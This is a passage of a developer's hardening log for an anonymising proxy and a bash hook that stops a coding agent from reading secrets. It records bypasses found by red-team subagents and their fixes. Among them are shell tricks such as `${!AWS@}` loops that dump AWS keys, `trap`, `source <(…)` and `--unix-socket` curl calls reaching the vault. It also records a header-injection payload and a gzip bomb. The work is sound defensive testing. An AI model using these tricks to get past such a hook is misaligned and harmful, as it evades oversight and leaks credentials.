  the linker loads `LD_PRELOAD`. `ENV=` is only refused when its value is a
  PATH (`ENV=production` is a common idiom), `NODE_OPTIONS` only when it
  carries `--require`.
- **`bash -c env _`**: the value of `-c` is the WHOLE SCRIPT, `_` occupies
  `$0`. Quoting having already been removed, both readings are
  indistinguishable: we emit BOTH, as for an expansion branch.
- **`env --split-string=CMD`**: the ATTACHED long form starts with `-`, it
  passed for an ordinary option; separated `-S` was already covered.

**Availability — the DoS did not come from where I thought.** A twenty
thousand character word cost seven seconds. The braces budget from rounds 8-9
could do nothing about it: it is `re.search` that explodes BEFORE, on
patterns whose head is a FREE CLASS (`\S*\{…`, `[\w-]*\.env`,
`[\w./-]*secrets?`) — they backtrack at every position. All anchored on
their literal, brace expansion happens word by word after whitespace
splitting: **0.04 s**. Two of the three patterns had been there from the
start, never measured.

**False positive introduced then fixed**: removing `{}` everywhere broke
`xargs -I{}`, caught by the round-8 unit tests.

**Test expectation corrected**: the report gave
`env --split-string='printenv HOME'` as a bypass — `printenv HOME` exposes
nothing, allowing it is the right behaviour. Checked on the HARMFUL payloads
(`printenv AWS_…`, `curl`, `env`), all refused.

**Residual of the extensions rule, STATED instead of assumed.** My round-8
comment claimed the single-label restriction "makes them safe": that is
FALSE. It BOUNDS the leak. `.md`, `.pl`, `.py`, `.rs`, `.ml`, `.tf` are
ccTLDs, so an external single-label domain (`acme.pl`) leaves in the clear.
The span type does not let us decide — measured: `acme.fr` in "the server
acme.fr" and `infra.fr` in "the file infra.fr" give the SAME types
(HOSTNAME + URL). Removing these extensions would turn `main.py`, `lib.rs`
and `main.tf` into fake domains, which has already broken a real session.

**Jo's arbitration (2026-08-04)**: the list is rejudged extension by
extension, not as a whole. `.pl` (Poland) and `.ml` (Mali) LEAVE — they are
the two list ccTLDs that carry a real volume of domains, and their value as
an extension is low here (zero Perl or OCaml file in the repo). `.md`,
`.py`, `.rs`, `.tf` stay: those are 54 files in the repo, quoted every turn.
And the residual stops being SILENT: `/detect` returns `public_by_shape`,
the deduplicated list of tokens made public by a FORM rule, with their span
types and the rule at fault. An EXACT entry does not appear there — it is a
decision taken token by token, not a heuristic.

## Round 11 (2026-08-04) — walker and engine

**CRITICAL — my round-10 fix was still forgeable.** I had restricted opacity
to the `content` of an ASSISTANT message, by testing `node.get("role")` on
the CURRENT dict. Any nested dict bearing that role got the protection —
including inside a `tool_result`, whose content comes from an MCP server.
The property had been NARROWED, not removed: from "any dict of type
thinking" to "any dict of role assistant". Five surfaces, checked.
Legitimacy is a property of POSITION: it descends from the root `messages`
(`dans_messages`), it is not inferred from an isolated node. This is the
third time this trap closes on me — `SKIP_KEYS` at round 5, the protocol
heuristic at round 6, this one.

**The FREE tail of the form rules, everywhere else.** Round 8 had closed
this class for the extensions rule. The same tail remained in URL paths
(`(/[\w./-]*)?`), Go import paths and image paths — and the last two accept
the DASH, so a real hostname fits in there: `k8s.io/db-01.acme.internal`,
`registry.k8s.io/db-01.acme.internal/app`,
`https://json-schema.org/db-01.acme.internal/schema` came out in the clear.
Each segment is now bounded to a word or a file name (ONE dot); for an
image, to a word without dot — in an image reference, the dot marks a
registry host, already pinned by the prefix.
**The agent had only tested URLs and Java packages: the six Go and image
path leaks come from my own extension of the perimeter.**

**Two minor defects, both future breakages**: an unexpected sub-key in
`cache_control` caused `type` to be substituted — which only accepts
`ephemeral` — hence 400 on the WHOLE request as soon as Anthropic adds a
field; and an unknown SSE event type was rendered verbatim, its surrogates
not restored (the operator sees the fictional name, a tool would execute on
it).

**Accepted residual, counted**: a SINGLE-label segment under a public prefix
(`sigs.k8s.io/tenant-acme-nda`, `org.apache.kafka.…acme.PaymentsClient`)
stays public — indistinguishable from a real module or a real package. Java
packages do not accept the dash, which excludes most internal hostnames.

### Hook — round 11: four bash mechanisms never modelled
The instruction I had given myself at round 10 — "look for what has NEVER
been modelled, not only the regressions" — paid off: four families were
covered by NO rule.
- **`trap CMD SIGNAL`** executes CMD on the signal (`EXIT`, `ERR`, `DEBUG`,
  `RETURN`, numeric). The signal name FOLLOWS the command, so
  `trap env EXIT` read as "env executes EXIT", therefore a legitimate
  prefix. The command is isolated — same remedy as `bash -c env _` at
  round 10.
- **`case MOTIF) CMD;;`**: the command follows the closing parenthesis, and
  the analysis stopped on `case`. Recognised ONLY in command position,
  otherwise a commit message containing "case … in …" would see its
  parentheses cut and the prose would become code again.
- **`coproc [NOM] cmd`**: the name being optional, the command occupies
  either the first position or the second — both readings are emitted.
- **`mapfile -C RAPPEL -c N`** executes RAPPEL every N lines read.
- **Alias expanded on a FOLLOWING line**: `alias e=env` then `e`. The
  previous round had wrongly concluded aliases do not execute — that is
  true on the line that DEFINES them, false on the following ones.

**Three regressions of my round-10 fixes**:
- **Denial of service in the variable check**: I was searching EACH target
  in the whole command, so O(targets × length). Five thousand `declare -n`
  — all bash primitives — hung the hook for 3.25 s, twenty thousand for a
  minute, before EACH tool call. Index built in one pass: **0.21 s**.
- **Function names**: I only walked back over word characters, while bash
  accepts `my.fn`, `a+b`, `a@b`, `a/b`, `1fn`.
- **Interpreter option grammar**: a VALUED option
  (`python3 -X faulthandler <<< …`) cut the chain, and the interpreter was
  no longer seen as receiving a program.

**Dead list removed**: `_INTERPRETE_EN_LIGNE` duplicated `_INTERPRETES`
without being read anywhere. Sixteen interpreters added (`python2`, `pypy`,
`ipython`, `groovy`, `elixir`, `racket`…) — a `groovy -e` reading the
environment table (System.getenv()) got through on a machine where it is
installed.

**Zero false positive measured** on the same mechanisms in normal use
(`trap 'rm -f /tmp/lock' EXIT`, `case $1 in build)…`, `mapfile -t`,
`python3 -X dev script.py`, `alias ll='ls -la'`).

## Round 12 (2026-08-04)

### Walker — every protocol key was copied UNCONDITIONALLY
`name` and `id` had been scoped in round 4; the other eight, never. A third
party — MCP server, manipulated tool output — could place
`{"type": "text", "role": "<real host>"}` in its subtree and the value went out
verbatim. Worse: a node's "protocol" character was INFERRED from its own
`type`, so writing `{"type": "tool_use", "name": …}` was enough to obtain the
protection — the same forgery as opacity, in the same places, not fixed at the
same time.

Unified rule: **a protocol key is guarded either by its POSITION or by the
SHAPE of its value, never copied unconditionally.** `type`, `role`,
`stop_reason`, `model`, `media_type` have a closed vocabulary
(`SCALAR_SKIP_FORMS`) — a hostname never looks like a role. `name`, `id`,
`tool_use_id` require a position: a block DIRECTLY under a message's `content`,
and the type expected for that key. `signature` leaves the list: its only
legitimate position is a signed block, rendered verbatim well before the loop.

### Walker — an encoded text document went out WHOLE
`type: "base64"` says how the payload is ENCODED, not what it contains. Taking
it as proof of binarity meant copying any text document verbatim: pasting JSON
or YAML into a prompt — the most ordinary gesture there is — sent the whole
file. Only `media_type` is authoritative now, and a text payload is DECODED,
pseudonymised, re-encoded. What does not decode as UTF-8 is binary despite its
header and stays intact.

### Allowlist — a two-label host fits in a "one dot" segment
Round 11 bounded paths to "a word or a filename". But `acme.internal` has
exactly the shape of `index.html`. A path segment now carries NO dot at all.
Accepted price: a filename inside a documentation URL gets substituted —
damaging a URL is visible and cosmetic, letting an internal host out is not.

### Hook — seven mechanisms, two of them regressions of my round-11 fixes
- **A sub-command carried by an ARGUMENT** (`trap -- 'env' EXIT`,
  `mapfile -C 'sh -c env'`): my round-11 isolations kept only the FIRST token.
  It is now analysed recursively, and BOTH readings are emitted — one word, or
  all the rest: quoting having been removed, we do not know where it ends.
  Signal specifications, a closed vocabulary, are stripped from a `trap` tail.
- **An expansion can evaluate to EMPTY**: `${IFS//?/}` replaces everything with
  nothing, `${V:0:0}` is a null slice. The surrounding characters then rejoin
  and rebuild the name. I reduced IFS to a SPACE, which only covers the form
  that evaluates to a separator. Rather than enumerating provably empty forms,
  the "everything is empty" reading is emitted and analysed as a command.
- **A variable name arrives indirectly**: `x=$y`, `x=$(…)`, `read x <<<`,
  `printf -v x`, `declare -n r` then `r=…`. The index only accepted a literal
  on the right-hand side. The chain is now followed, bounded; an opaque source
  means refusal (fail-closed).
- **Sandbox wrappers** (`bwrap`, `gdb`, `setpriv`, `firejail`, `valgrind`):
  their options take a VARIABLE number of values — `bwrap --dev-bind SRC DST` —
  so no option grammar holds. Every following word becomes a possible program
  position. Accepted over-approximation: those wrappers are rare.
- **`env # comment`**: bash cuts the line at the hash, but the hook read the
  comment as the program executed by `env`, hence as a legitimate prefix.
- **Combined short options** (`declare -px`), `typeset` as an alias of
  `declare`, `exec -a NAME cmd` (argv[0] occupied the program position),
  `script -c CMD`, and `PROMPT_COMMAND` / `command_not_found_handle`, which
  carry a command and not data.

**Zero false positives measured** across twelve common idioms; availability
unchanged despite the double reading (500 KB of text in 0.80 s).

## Round 13 (2026-08-04) — hook

**Both agents first died of a stream idle timeout returning nothing.** Asking
for "an early partial report" is not enough: the instruction that works is
delivery in NUMBERED BATCHES, with a written synthesis after each, six at most.
Noted in `REPRISE.md` — that is the second time this failure mode has cost a
round.

**Inverting the burden of proof on indirection.** Four of the seven findings
shared a root: `${!x}` reads the variable NAMED by the value of `x`, and that
value can come from a `for` loop, a `select`, a positional parameter, a
`set --`, a function argument, a `read` attached to the enclosing block. I had
been enumerating those mechanisms for three rounds and new ones kept appearing.
From now on **we refuse unless we can DEMONSTRATE that the name read is
harmless**: the list of harmless indirections is short and boundable
(`${!arr[@]}`, which yields indices), the dangerous one is not. That closes in
one go `for`, `select`, `${!1}`, `${!*}`, `set --`, function arguments,
`while read … done <<<`, and the thirty-hop chain that exceeded my iteration
bound.

Other fixes:
- **`source <(echo env)` and `. <(…)`** execute the CONTENT of their argument.
  `source` and `.` were neither wrappers nor interpreters: their argument was
  never treated as code. Added to the wrappers — the substitution marker then
  lands in program position and the command is refused, while a literal path
  stays sourceable.
- **A POSITIONAL or SPECIAL parameter can name the program**: `f() { $1; }; f
  env`. My round-9 fix covered `$LETTER`, not `$1`, `$@`, `$*`.
- **`fc -l`** reads the same command record as `history`, already refused.

**False positive introduced then fixed, twice over on myself**: a REGEX quoting
the indirection syntax was taken for an indirection, which made this very hook
impossible to write. The expansion must be WELL FORMED — closing brace nearby,
no metacharacters between. And `${!arr[@]}` escaped my exclusion because glob
class normalisation reduced it to `${!arr@}`.

### Walker — round 13: my base64 fix covered one case out of two
- **Only UTF-8 was pseudonymised.** A Windows CSV in UTF-16, a latin-1 log, a
  CJK export went out VERBATIM: the decoder returned the payload unchanged as
  soon as UTF-8 decoding failed. Decoding now tries several charsets, in an
  order decided by the byte-order mark and by zero density — decoding ASCII as
  UTF-16 yields ideograms, and the reverse breaks the text. A zero in the
  result signals a wrong decode: real text has none.
- **The payload was only examined under `type: "base64"`.** An MCP server puts
  it under `resource`, `text` or whatever it likes, and it went out whole.
  base64 is base64 whatever the block type says.

**Routing — two divergences that make the request fail**: a
`web_search_tool_result` and a `code_execution_tool_result` also carry a
`tool_use_id`, absent from my table; it was therefore substituted while the
matching `server_tool_use.id` stayed verbatim. And `mcp_tool_use.server_name`
designates the `mcp_servers[].name` entry, which stays verbatim (routing key):
substituting it broke the correspondence silently. An existing test asserted
the opposite — it encoded the inconsistent behaviour, and it is corrected.

**Closed vocabularies that were too wide**: `command` and `titan` are English
words, so `commander-billing-prod-01` and `TITAN-CORP-VAULT` passed as model
names (and case-insensitivity widened it further) — only `claude` travels on
this channel. A `type` with a purely numeric segment (`srv_billing_01`) is a
hostname convention, not a block type. And a media type's top level is a CLOSED
registry: without it, `srv-billing-prod-01/acme-internal` had the shape.
Widened in the other direction at the same time, so as not to break real
values: `role=developer|tool`, `stop_reason=content_filter|length`, and
RFC 6838 parameters (`text/plain; charset=utf-8`), which my shape refused.

**Message `id`**: being inside `messages` alone made it verbatim, so a forged
`{"role": "user", "id": "<real host>"}` went out. A message carries neither
`name` nor `id` in a request.

**Accepted residual**: a lowercase `type` with no numeric segment
(`db_master_prod`) stays indistinguishable from a block type. Same limit as
everywhere else — a question of inventory, not of shape.

## Round 14 (2026-08-05)

Both halves found the SAME thing: my fixes from the day before had hardened one
branch and left its twin untouched.

### Hook — the inversion covered only one of two branches
I had made `${!x}` fail-closed, but `declare -n r=TARGET` read the target
DIRECTLY — which is right when it is written in clear, and wrong when it comes
from a positional parameter: `f() { declare -n r=$1; }; f AWS_…` declared the
target harmless for want of a visible assignment. A target that is not a
literal identifier now requires the same proof as indirection.

**The substitution marker was SURROUNDED by spaces.** `A=x $V` (two words, the
second is the program) therefore became indistinguishable from `A=x$V` (one
word, an assignment value) — and the exception made in round 8 for the second
covered the first, which does execute. The marker now stays GLUED where the
substitution was; the exception disappears by itself, and opacity is tested by
containment rather than equality.

**`${VAR@P}` interprets the prompt, therefore EXECUTES** the substitutions the
variable contains. Two levels were missing: my normalisation reduced `${X@P}`
to `$X`, making the operator vanish before any pattern could see it; and
`printf -v PS1` rebuilt the `$` via `\x24`, out of reach of the PS0/PS4
pattern.

**Arithmetic reads a variable WITHOUT a dollar**: `echo $((AWS_SECRET…))`,
while the name control required the sigil.

Four false positives fixed: `declare -pF` (the `-F` is about FUNCTIONS, no
value is listed) · a regex quoting `\${!x}` — `\$` is a LITERAL dollar, so
reducing it to `$` made it a real indirection · `${!ARR[@]}` where the array
carries a sensitive name (only INDICES come out) · a process substitution in
WRITE mode (`> >(tee log)`), which names a destination and not a program.

### Walker — I had closed the first level and left the sub-type open
`SCALAR_SKIP_FORMS["media_type"]` pinned the top-level registry (round 13) but
left the sub-type accepting dots: `text/db-01.acme.internal` had the shape and
went out verbatim, with no vault entry and no unresolved surrogate. Sub-type
without a dot, bounded `vnd.`/`prs.` trees, explicit `x-`; the ten real types
tested stay intact, including
`application/vnd.openxmlformats-officedocument.wordprocessingml.document`.

Two breakages waiting to happen: the MCP protocol writes **`mimeType`**
(camelCase), which I did not read — a small binary payload there was taken for
text, so decoded, substituted and re-encoded, i.e. CORRUPTED. And
`container_upload.file_id` designates an ALREADY uploaded file: substituting it
yields an identifier matching nothing.

**Accepted residual**: a vendor tree is dotted BY NATURE
(`application/vnd.acme.db-01.acme.internal+json`). Telling them apart would
require knowing that `acme` is ours — a question of INVENTORY, not of shape.
Same arbitration as packages under a third-party prefix.

**Vault and concurrency, no findings**: isolation between scopes, persistence
after reopening, fail-closed on a wrong key, injectivity across 50 threads and
50 values, determinism across processes, 4000 values without exhaustion. D1 and
D6 hold — the first time they had been attacked from that angle.

## Round 15 (2026-08-05)

**First half to reach the stopping criterion.** The walker/engine agent
explicitly reports NO critical or high finding, after attacking the proxy, the
detection service, the exotic API surfaces and the engine. The hook produced
three, plus a denial of service.

### Hook — yesterday's exemption opened a leak
`${!arr[@]}` yields an array's INDICES; `${!PREFIX@}`, **without brackets**,
ENUMERATES THE NAMES of variables starting with PREFIX — that is, the list of
secrets present in the environment. My normalisation reduced `[@]` to `@`
(anti-glob rule), the two forms became identical, and I had widened the
exemption to catch the false positive that created. `A=x; for A in ${!AWS@}; do
echo ${!A}; done` therefore dumped the AWS keys. Brackets are now preserved by
normalisation and REQUIRED by the exemption.

**A variable BOUND at runtime is as unknown as an indirection.** `for VAR in`,
`select VAR in`, `while read VAR … done <<< …`, `read -u FD VAR`,
`getopts SPEC VAR`: five mechanisms falling one after another. Rather than keep
enumerating them — the round-13 lesson — the bound variable is marked OPAQUE,
and the proof indirection requires fails by itself.

**`readonly -p` prints values**, like `declare -p`, and was not in the dumper
list. The logic of those builtins is taken over wholesale: a NAMED variable
means the name decides, an ASSIGNMENT prints nothing, and with no named
argument they DUMP (`readonly -a` lists arrays with their values).

**Denial of service**: my brace-expansion budget counted ALTERNATIVES, not the
SIZE of the produced text. Eleven alternatives across a hundred groups fitted
the budget comfortably while producing megabytes, whose re-reading froze the
agent **twenty seconds per tool call**. Character budget added: 0.76 s.

### Engine — two D1 breaches, with no effect on protection
No real value was leaving; the model simply received a reference it could no
longer read, which breaches D1 ("plausible surrogates").
- **The allowlist was case-sensitive.** `GitHub.com/spf13/cobra` and
  `LOCALHOST` were substituted while `github.com/spf13/cobra` and `localhost`
  are public: nothing was protected, and the model lost the reference. An entry
  written ALL LOWERCASE denotes a case-insensitive identifier; an entry
  carrying a capital MEANT it (`Mail.Read` is a permission, not a word). The
  entry's own casing declares whether case matters — nothing to classify by
  hand. Rule duplicated on both sides of the D7 boundary, like the parser.
- **A scheme with no `//` carries no authority.** A `mailto:` at-sign separates
  the local part from the domain: taking it for userinfo made the scheme AND
  the local part disappear, and the model received a hostname where there was
  an address. Same for `data:`, and a SELF-HOSTED repository fell back to a
  plain WORD, which the model can neither clone nor read as a URL.

## Round 16 (2026-08-05) — hook

**A single finding, and it lands squarely in the two patterns I had asked to be
looked for.** In the previous round I had SEPARATELY hardened the array-index
exemption (`${!arr[@]}`, which now requires brackets) and indirection detection
(`${!name}`, whose class excluded the opening bracket). Between the two,
`${!m[k1]}` was covered by NEITHER — although it is a full indirection: the
element's VALUE names the target, and bash follows it. Six subscript forms
checked, all open.

It is the TWIN pattern and the OVERFLOWING EXEMPTION combined: two neighbouring
guards, each hardened on its own, leave a hole in the middle. Naming those
patterns in the agent's instructions is what made it look there.

Availability and false positives: nothing to report across 78 DevOps commands
and 25,000-character inputs (45 ms).

**False positive added to the accepted list**: quoting the indirection syntax
inside a string (`echo 'the syntax is ${!x}'`) is refused. Quoting is removed
by the anti-obfuscation normalisation, so a quotation becomes indistinguishable
from a real expansion. Whitelisting regions between single quotes would be
WRONG — `bash -c '${!x}'` does execute them. The refusal is visible and can be
worked around (quoted heredoc, split string), whereas the opposite would be
silent.

### Engine — round 16: SECOND clean round in a row
No critical or high finding, after attacking as a priority the rule that had
just WIDENED what is public (case-insensitivity), authority-less URIs, the
proxy, the detector, the walker and the engine.

**The open question has its answer**: the proxy IS fail-closed when the
detector is unavailable — `DetectionUnavailable` propagates to a 503, verified
against a closed port too. Documented nuance: text ALREADY pseudonymised keeps
being served from cache during the outage; only new text yields a 503.

**One D1 breach fixed**: a digest's algorithm prefix (`sha3-256:`, `SHA-256:`,
`blake2b:`, `keccak256:`, `xxh64:`) was LOST — the operator saw bare hex with
no idea what they were looking at. The registry stays CLOSED, and that is
essential: a free form would preserve `srv-billing-01:deadbeef`, hence leak the
part before the colon. Two tests pin both sides.

**Measured, accepted limit**: an UNRECOGNISED URI scheme carrying an at-sign
(`webmail:alice@host`) falls into the SSH branch and loses its structure. The
local part is discarded, so nothing leaks — it is a semantic loss, of the same
order as the one fixed for `mailto:` in round 15.

## Round 17 (2026-08-05) — the hook splits commands with a GRAMMAR, not approximations

jo's arbitration: stop the adversarial loop, attack the parser. Done.
`tokenize` is built on `tree-sitter-bash`; detail, traps and measurements in
`docs/hook-parser.md`. What fourteen rounds of heuristics approximated —
`case`, function definitions, groups, heredocs, comments, concatenations — is
now given by construction.

**The pass ORDER is the whole subject.** Splitting works on the RAW command;
the regex checks keep the normalised text. Normalising before parsing made a
structure REAPPEAR that the quotes had suppressed: `git commit -m 'handle case
in parser(env)'` became a subshell running `env`. The nine false positives of
the first wiring all came from that — they resurrected in one go the defect
rounds 5, 8 and 9 had eliminated.

**Four traps, each paid once**: brace expansion must precede the grammar
(`{env,}` makes it ERROR, and the rebuilt word appears nowhere) but only
OUTSIDE quotes, otherwise a JSON body breaks the quote pairing the grammar
depends on · the grammar refuses function names bash accepts (`a@b`, `a%b`,
`1fn`), and the BODY disappears with the name — only the name is replaced · a
QUOTED argument no longer reads by accident, it must be RE-PARSED (`-c` of a
shell, `trap`, `mapfile -C`, `env -S`, heredoc body) · a `-exec` clause
terminator arrives as an ordinary word, and made `env` look like a prefix
running `;`.

**Bypass introduced by my own fix, found by attacking the new code**:
`bash -c"env"` yields a CONCATENATION node, reduced to `-cenv`, which neither
the `-c` rule nor the re-parsing saw. Splitting it in the tokenizer would be
wrong — bash does produce ONE word, and `/usr/"bin"/env` must stay
`/usr/bin/env`: it is for the option-reading layer to separate `-c` from its
attached value. Same TWIN pattern as previous rounds.

Corollary found while fixing: `${IFS,,}` is not an alternative but a case
operator — without the `(?<!\$)` in `_ACCOLADES_RE`,
`env${IFS,,}> /tmp/dump.txt` was rewritten as `env$IFS> env$> env$>`.

**The grammar is a PREREQUISITE of the analysis**: without it, `tokenize`
raises and the hook REFUSES. Since Claude Code runs the hook under the system
python, which lacks it, `main` re-execs under the project interpreter
(`os.execv` preserves stdin) — never at import, or a test suite without the
grammar would replace its own process.

Proofs: 1255 unit tests, `tests/phase4_e2e.sh` **PASS** in a real session
(refusal before execution, traced, exact reason quoted by the model),
`tests/phase3_e2e.sh` **PASS** (0 real values across 393.6 KB, restoration
3/3). Availability: 0.003 s on a realistic command, 0.42 s on 500 KB.

## Round 18 (2026-08-06) — three defects found IN SESSION, two of them by the model

The policy layer and the announcement are delivered (`src/anonproxy/policy.py`,
`annonce.py`, `scripts/anonproxy_policy.py`, `tests/policy_e2e.sh`). A sandbox
for real sessions lives outside the repo, with its own vault and key.

**What the session found and sixteen review rounds had not.** `10.1.2.0/24` is
not an address: `ip_address` failed, the value fell into the generic branch and
went out as a WORD (`glacier-vault10`). The model saw hosts inside a fictional
network and a subnet declaration that was not one — it reported the inventory
as self-contradictory · DOCUMENTATION ranges are `is_private` in Python
although they stand in for routable addresses, so a public gateway received a
`10.x` surrogate, and the IPv6 generator returned a ULA whatever the input: the
"internal versus external" attribute (§3.4) held neither for those ranges nor
in v6 · **the worst**: varying the third octet of a documentation /24 to obtain
several networks LEAVES the reserved space and lands on allocated, routed
address space — `198.51.32.0/24` belongs to someone. A surrogate must never
name a third party's machine, or a command the model proposes goes to their
network. Fixed with RFC 2544 (`198.18.0.0/15`), reserved for benchmarking.

**An existing test pinned the confusion**: it checked `is_private` where the
preserved attribute is "internal". `est_privee` now says what we actually mean.

**The invariant that closes the CLASS**
(`tests/test_invariant_substituts.py`): *a surrogate must be indistinguishable
in NATURE from what it replaces, and must never designate a REAL-WORLD
entity.* Stated once — the canonical `kind` of the surrogate must equal that of
the real value — it covers all three and the next ones. Verified
NON-complacent: replaying each of the three defects makes it fail. The three
were not implementation oversights but an invariant never stated.

**MEASURED residual, arbitration pending**: a fictional external host combines
a fictional-company word with a REAL TLD — `alpine-relecloud.net` may belong to
someone. Same family as the routable defect, wider surface, and unverifiable
without a DNS lookup (hence without breaking D9). The RFC 2606 alternative
(`.example`, `.invalid`, `.test`) is provably nobody's but reads as fictional,
which costs D1. **40/40 external hosts affected**, counted by the test, not
asserted. Since round 19 this is the `domaines_fictifs` setting, so jo can
choose per scope rather than once and for all.

**No skill for this (settled 2026-08-06)**: a skill acts on the CONSUMER, these
defects are in the PRODUCER. A skill could only teach the model to cope with
the artefact — which is what we measured as failing. And making protection
depend on the model cooperating is the §7 anti-pattern. The announcement, on
the other hand, is acknowledged embedded prompt engineering: it INFORMS, it
does not protect — and it is what found two of the three.

## Round 19 (2026-08-06) — control API, and the exemption that overflowed

The control surface for the interface (VSCode/VSCodium extension in
`extension/`, plain JavaScript, no build step). **Control surface, never an
enforcement point**: uninstalling the interface must open nothing — the design
test to repeat at every addition, or §7 comes back dressed as an IDE.

**Unix socket, never a port.** The API shows REAL values — that is its purpose.
The agent runs on the same machine and the hook lets loopback through, so a
port would have reopened the §3.5 mitigation, with the agent reading the vault
over HTTP instead of the file. Accepted price: a browser cannot speak to a Unix
socket, so the idea of a local page opened in the IDE dies with this choice —
the interface must be a real client (Node does it natively).

**BYPASS I was about to ship, found by distrusting a test that PASSED.** The
E2E did refuse the socket, but on the grounds of "network egress": a refusal
obtained by accident gets bypassed. With
`curl --unix-socket … http://localhost/questions`, the "local URL" exemption —
written so the agent could reach the project's detector — applied, and the
agent read the vault. Three forms passed, including `--abstract-unix-socket`.
With a socket flag the URL is DECORATIVE: the destination is the socket. This
is the OVERFLOWING EXEMPTION pattern, the same as round 15.

Lesson worth keeping: **a refusal obtained for the wrong reason is not a
refusal.** Check WHY a test passes, not only that it passes.

## Round 20 (2026-08-06) — Go, and the reasons for it

The control service is now Go (`go/cmd/anonproxy-control`), in English,
endpoints included: `/health`, `/questions`, `/rules`, `/decide`, `/settings`,
`/events`.

**Go rather than Rust**, and not only because Rust is not installed here. RE2
is the decisive argument: rounds 8, 9 and 10 were spent on catastrophic regex
backtracking — a free class at the head of a pattern cost seven to fifteen
seconds and could freeze the agent without a single forbidden command. Go's
regexp cannot backtrack, so that whole family stops being a defect to find and
becomes impossible to write. A static binary also removes the hook's venv
re-exec and its grammar bootstrap, and the streaming story is what was needed.

**What cannot move**: the detector is a Python ML library, so
`services/anonshield/` stays Python. It already sits behind HTTP by D7, so that
boundary costs nothing.

**The vault crypto is ported exactly, not approximated** — same
domain-separated HMAC keys, same length-prefixed index and associated data,
same padded AES-256-GCM — and `tests/control_e2e.sh` has Go decrypt a vault
Python sealed, which is the only way to know the port is right.

**`/events` is Server-Sent Events.** One-way is the actual need — events out,
decisions in by POST — and SSE needs no dependency on either side, carries
reconnection in the protocol, and is the mechanism this project already parses.
A WebSocket would have added a second concept for no gain. Polling is gone from
the extension, which matters in the case that motivated the blocking mode:
learning three seconds late that a request is stuck on you is three seconds of
an agent doing nothing.

**The binary has no default state paths** and refuses to start without them: a
second source of truth would drift from the launcher's, and silently reading
the wrong store is worse than not starting.

**Remaining migration, in order**: the hook (biggest gain — startup, RE2, no
venv — and its 708 tests already drive it as a SUBPROCESS, so a Go binary is
validated by the existing suite unchanged), then vault and engine, then proxy
and walker. Twelve Python patterns use lookaround, which RE2 does not support:
each needs restructuring as "match then verify in code", and each restructuring
is a chance to break a control hardened over nineteen rounds.

## Round 21 (2026-08-06) — three parallel agents, two dead, one defect found

jo asked for parallel work with subagents. Three were launched on disjoint
paths: the Go hook port, the CLAUDE.md rounds, and REPRISE plus docs.

**Two died mid-stream** — the same failure mode as round 13, despite the
numbered-batch instruction that round 13 prescribed. The instruction is not
enough: the unit of work has to be smaller. The rounds agent completed nine
sections before dying and its work was saved; the Go agent left a skeleton that
did not compile, referencing a package it never wrote.

**A half-swapped security control is not shipped.** The Go skeleton was removed
rather than left in the build — the same call as round 17, when the parser
wiring was reverted at fifteen failing tests. It is kept outside the repo as a
reference.

**The launch itself found a defect.** Starting the agents was REFUSED twice, on
prose: the `description` field of a tool call carrying the word for a
chronological command record matched a text pattern. "git history", "release
history", "incident history" were all refused — most of an engineering
vocabulary. Rounds 8 and 9 had already settled the principle for everything
else: the gate applies to the PROGRAM POSITION, not to the word appearing in
the text. That rule had simply never been migrated to it. Recognising it by
position also covers the wrappers by construction rather than by accident.

## Round 9 of the forward loop (2026-08-12) — three agents died, and it still paid

All three subagents died mid-stream before executing anything — the SAME
failure mode as rounds 13 and 21, despite the numbered-batch instruction those
rounds prescribed. **They were RESUMED** (a dead agent keeps its transcript;
one message asking for an immediate report recovers it) and each returned its
reading as SUSPICIONS. Nothing was proven by them. Three of their leads turned
out to be real once I proved them myself, one was a false positive, the rest
are documented residuals. The lesson is not "agents are useless" — it is that
**the returnable unit has to be one message, not one investigation.**

**Gzip bomb, HIGH — my own `edc85df`.** `_lire_corps` bounds what the proxy
READS to 32 MiB; `gzip.decompress` allocated whatever the upstream decided.
Measured: 199 KiB of payload → 400 MiB resident, and at the input limit it
would be thousands of times more. **The only bound on the path applied to the
wrong quantity.** Decompression is now bounded on its OUTPUT, and a multi-member
stream is refused rather than silently truncated.

**A `\r` in a header NAME, HIGH — the JUMELLE for the THIRD time.** Round 7
refused control characters in header VALUES, round 8 in the STATUS line; names
were never checked. `x-innocent\rset-cookie: PWN=1` parsed fine, was copied
verbatim, and a client accepting a bare terminator reads the injected header.
Fixed at the CLASS this time: the split is on `\r\n`, so any `\r` or `\n`
surviving in ANY line of the head is a bare terminator — one condition, no
twin left. **My first version of the fix quoted the offending line in the 502
body**, so the injected header came back to the client through the refusal
itself; my own existing test caught it.

**A session-scope reveal crossed scope keys, HIGH.** `session-<id>.json`
carried no scope key while the project file did: the NARROWEST scope leaked
WIDER than the wider one. Default session name being `sans-id`, the collision
is the ORDINARY case once a policy root is shared. Revealing is never
inherited — and crossing a scope is a form of inheritance.

**Rejected after proof**: span offsets are CHARACTERS, not bytes — both
detectors slice exactly on a text carrying five bytes of accents. **Accepted
and stated**: an upstream dripping one byte under the deadline holds an
exchange (a total ceiling would cut a legitimate slow body — the twin defect,
and the reason the deadline is written as inactivity).

## Round 10 of the forward loop (2026-08-12) — narrow perimeters, and they held

Four agents on four disjoint, DELIBERATELY NARROW perimeters, told to report
after the first proven fact rather than at the end. None died; all four ran
their own reproducers. That is the round-9 lesson applied, and it is what
changed: the returnable unit has to be small enough to survive.

**Nine defects, and three of them are mine from the day before.**

**A base64 payload at the FIRST level under `params`/`result`/`error` went out
verbatim — CRITICAL, silent.** Decoding lived in the branch that walks nested
dicts; the first level has its own branch and did nothing. My original test put
the payload in `params.arguments` — **the half that worked**.

**The declared media type decided whether to protect — CRITICAL.** It is
written by the upstream. Labelling text `image/png` made it travel intact, and
two contradictory spellings of the key (`mimeType` and `mimetype`) let the
sender pick the one that suited. **Making protection depend on a value written
by the party you are protecting against is the §7 anti-pattern**, and it had
been sitting in the gate itself. The DECODE decides now: base64 that yields
clean UTF-8 is text whatever anyone declares; a real binary fails on its first
bytes, and `_semble_du_texte` catches the ones that pass by luck.

**Scope file names collided — CRITICAL, four ways.** Substituting characters
(`:` → `-`, `/` → `_`) cannot be injective, so `proj:client` and `proj-client`
wrote the same file and a *reveal* crossed between scopes. The fourth case was
**created by my fix of an hour before**: the `-session-` infix made project
`acme-session-prod` collide with session `prod` of project `acme` — across the
scope AND the boundary. Fixing an escaping scheme with another escaping scheme
reproduces the class; what decides is now a fingerprint of the exact tuple.

**A refusal quoted what the upstream wrote — HIGH, and I had fixed ONE site of
four.** Round 9 closed the header parser and left the status line, the
`content-length`, the chunk size. A hostile upstream plants readable text —
a fake warning, a command to run — straight into the operator's terminal,
